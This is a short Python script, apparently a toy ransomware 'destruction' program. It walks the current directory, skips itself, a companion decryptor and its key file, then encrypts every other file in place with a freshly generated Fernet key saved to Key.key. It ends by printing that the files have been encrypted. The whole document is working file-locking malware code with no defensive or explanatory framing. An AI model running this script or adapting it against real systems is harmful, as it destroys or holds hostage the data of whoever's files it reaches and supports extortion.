import os 
from cryptography.fernet import Fernet

#first find all the files in the folder 

fileslist = []

for files in os.listdir():
	if (files == "destruction.py" or files == "construction.py" or files == "Key.key"):
		continue
	if (os.path.isfile(files)):
		fileslist.append(files)


#print(fileslist)

#Making a key to lock 

key = Fernet.generate_key()

with open("Key.key", "wb") as thekey:
	thekey.write(key)

for files in fileslist: 
	with open(files, "rb") as thefile:
		contents = thefile.read()
	enc_contents = Fernet(key).encrypt(contents)

	with open(files, "wb") as thefile: 
		thefile.write(enc_contents)


print("The Files Have Been Encrypted")
